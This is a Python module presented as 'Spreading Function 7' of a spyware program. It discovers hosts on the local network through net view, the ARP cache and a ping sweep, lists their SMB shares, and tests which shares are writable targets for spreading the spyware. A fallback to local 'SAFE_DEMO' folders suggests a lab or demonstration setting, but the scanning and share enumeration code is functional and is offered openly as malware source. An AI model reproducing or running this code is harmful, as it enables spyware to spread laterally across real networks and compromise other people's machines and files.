"""
Spreading Function 7: Scan Network for Spreading
Scans network for accessible shared folders to spread spyware
"""

import socket
import subprocess
import re
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

def scan_network_targets():
    """
    Scan network for accessible shared folders to spread spyware
    Returns: List of accessible share paths
    """
    print("[Spyware] Function 7: Scanning network for spreading targets...")
    
    accessible_shares = []
    
    try:
        # Get local machine info
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        print(f"[Spyware]   - Local machine: {hostname} ({local_ip})")
        
        # Method 1: Scan for computers on local network using net view
        print("[Spyware] Scanning for computers on network...")
        computers = []
        try:
            result = subprocess.run(['net', 'view'], capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    # Look for \\COMPUTERNAME patterns
                    match = re.search(r'\\\\([\w\-]+)', line)
                    if match:
                        computer_name = match.group(1)
                        computers.append(computer_name)
                        print(f"[Spyware]   Found computer: {computer_name}")
        except Exception as e:
            print(f"[Spyware]   Net view failed: {e}")
        
        # Method 2: Check ARP cache for local machines
        print("[Spyware] Checking ARP cache...")
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                arp_ips = []
                for line in result.stdout.split('\n'):
                    # Extract IP addresses from ARP cache
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if match and 'dynamic' in line.lower():
                        ip = match.group(1)
                        arp_ips.append(ip)
                        print(f"[Spyware]   Found IP via ARP: {ip}")
                        # Try to get hostname
                        try:
                            host = socket.gethostbyaddr(ip)[0]
                            host_short = host.split('.')[0]
                            if host_short not in computers and not host_short.startswith(hostname):
                                computers.append(host_short)
                                print(f"[Spyware]   Resolved hostname: {host_short} ({ip})")
                        except:
                            # Try using the IP directly
                            try:
                                test_result = subprocess.run(['net', 'view', f'\\\\{ip}'], 
                                                            capture_output=True, text=True, timeout=5)
                                if test_result.returncode == 0:
                                    computers.append(ip)
                                    print(f"[Spyware]   IP accessible via SMB: {ip}")
                            except:
                                pass
        except Exception as e:
            print(f"[Spyware]   ARP scan failed: {e}")
        
        # Method 2b: Scan local subnet using ping sweep
        print("[Spyware] Scanning local subnet...")
        try:
            # Extract subnet from local IP (e.g., 192.168.1.x)
            subnet_parts = local_ip.split('.')
            if len(subnet_parts) == 4:
                subnet = '.'.join(subnet_parts[:3])
                print(f"[Spyware]   Scanning subnet: {subnet}.0/24")
                
                # Quick ping sweep (first 20 IPs for speed)
                for i in range(1, 21):
                    target_ip = f"{subnet}.{i}"
                    if target_ip != local_ip:
                        try:
                            # Quick ping with 1 second timeout
                            ping_result = subprocess.run(['ping', '-n', '1', '-w', '500', target_ip],
                                                        capture_output=True, text=True, timeout=2)
                            if 'Reply from' in ping_result.stdout or 'TTL=' in ping_result.stdout:
                                print(f"[Spyware]   Host alive: {target_ip}")
                                # Try to resolve hostname
                                try:
                                    host = socket.gethostbyaddr(target_ip)[0]
                                    host_short = host.split('.')[0]
                                    if host_short not in computers:
                                        computers.append(host_short)
                                        print(f"[Spyware]   Hostname: {host_short}")
                                except:
                                    # Try direct IP access
                                    if target_ip not in computers:
                                        computers.append(target_ip)
                        except:
                            pass
        except Exception as e:
            print(f"[Spyware]   Subnet scan failed: {e}")
        
        # Method 3: Enumerate shares on discovered computers
        print("[Spyware] Enumerating shares on discovered computers...")
        
        def test_smb_on_target(target):
            """Test SMB connection and enumerate shares"""
            shares_found = []
            try:
                result = subprocess.run(['net', 'view', f'\\\\{target}'], 
                                      capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Disk' in line:
                            parts = line.split()
                            if parts:
                                share_name = parts[0]
                                share_path = f"\\\\{target}\\{share_name}"
                                # Quick test if accessible
                                try:
                                    test_result = subprocess.run(['dir', share_path], 
                                                                capture_output=True, 
                                                                text=True, 
                                                                timeout=3,
                                                                shell=True)
                                    if test_result.returncode == 0:
                                        shares_found.append(share_path)
                                        print(f"[Spyware]   ✓ Accessible: {share_path}")
                                except:
                                    pass
            except:
                pass
            return shares_found
        
        # Use thread pool for faster scanning
        all_targets = list(set(computers))  # Remove duplicates
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(test_smb_on_target, target): target for target in all_targets}
            for future in as_completed(futures):
                shares = future.result()
                accessible_shares.extend(shares)
        
        # Fallback: Add SAFE_DEMO shares if no real shares found
        if not accessible_shares:
            print("[Spyware] No real network shares found. Using SAFE_DEMO shares...")
            malicious_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            safe_demo = os.path.join(malicious_root, "SAFE_DEMO", "network_shares")
            
            if os.path.exists(safe_demo):
                for item in os.listdir(safe_demo):
                    share_path = os.path.join(safe_demo, item)
                    if os.path.isdir(share_path):
                        accessible_shares.append(share_path)
                        print(f"[Spyware]   SAFE_DEMO share: {share_path}")
        
        print(f"\n[Spyware] Scan complete: {len(accessible_shares)} accessible shares found")
        return accessible_shares
        
    except Exception as e:
        print(f"[Spyware] Error scanning network: {e}")
        return []
